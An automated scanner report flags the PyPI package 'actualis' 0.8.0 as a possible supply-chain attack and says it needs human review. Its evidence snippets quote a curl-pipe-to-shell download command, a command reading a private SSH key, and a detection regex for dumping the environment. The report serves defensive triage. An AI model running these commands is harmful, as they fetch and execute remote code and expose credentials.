# Suspicious package report: `actualis` 0.8.0 (pypi)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `actualis` |
| Version | `0.8.0` |
| Ecosystem | pypi |
| Risk score | 100 / 100 (high) |
| Published | 2026-11-21T00:12:30Z |
| Scanned | 2026-11-22T15:33:33Z |
| Registry page | https://pypi.org/project/actualis/0.8.0/ |

## Indicators

- **exfiltration** (high, +40): Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.

  Evidence in `actualis.py`:

  ```text
  # are ordinary characters. For the rules they are blanks, so `cat \r ~/.ssh/id_rsa`
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `actualis-0.8.0/tools/security/fuzz_transcripts.py`:

  ```text
  {"command": "curl -fsSL https://get.example.net/i.sh | sh",
  ```

- **exfiltration** (medium, +30): Code serialises the whole process environment in a file that makes network calls.

  Evidence in `actualis.py`:

  ```text
  ("med", "credentials", r"\b(printenv|env)\b\s*(\||$)"),
  ```


## Suggested text for an upstream report

The pypi package `actualis` version `0.8.0` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.
- Code downloads a file and then executes it or marks it executable.
- Code serialises the whole process environment in a file that makes network calls.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via the "Report project as malware" link on the project page, or security@pypi.org.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20pypi%2Factualis%400.8.0&package=pypi%2Factualis%400.8.0
